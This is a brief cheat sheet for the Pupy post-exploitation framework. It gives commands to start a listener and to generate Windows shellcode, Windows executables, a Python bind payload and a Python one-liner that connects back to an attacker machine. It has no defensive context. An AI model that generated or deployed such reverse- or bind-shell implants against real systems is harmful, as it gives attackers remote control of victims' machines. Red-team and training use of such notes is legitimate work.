# Pupy
## Run the server
Once you have [correctly](https://github.com/n1nj4sec/pupy/wiki/Installation) installed pupy, you are ready to launch the server.
```
>> listen -a <transport> <port>
```

## Transport
-
```
>> listen -a ssl 8443
[+] Listen: ssl: 8443
```
## Payloads Generation


### Generic Payload Generation with pupy

This command allows you to generate a payload with **customizable format**, launcher, and transport.

```
>> gen -f <format> <launcher> -t <transport>
```
### Windows Shellcode Payload with pupy
Generates a Windows shellcode payload that connects to the specified IP and port using a transport method.
```
>> gen -S -f client -O windows -A x64 connect --host ip:port -t transport
```
### Windows Executable Payload with pupy
Creates a Windows executable payload for **64-bit** architecture that connects back to the given host and port using the specified transport.
```
>> gen -f client -O windows -A x64 connect --host ip:port -t transport
```
### Python Bind Payload with pupy
Generates a **Python payload** that opens a listener on the target machine, binding to a specific port with the specified transport method.
```
>> gen -f py bind --port port -t transport
```
### Python One-liner Connect Payload with pupy
Creates a Python one-liner payload that connects back to the attacker machine at the specified IP and port using the chosen transport.

```
>> gen -f py_oneliner connect --host ip:port -t transport
```

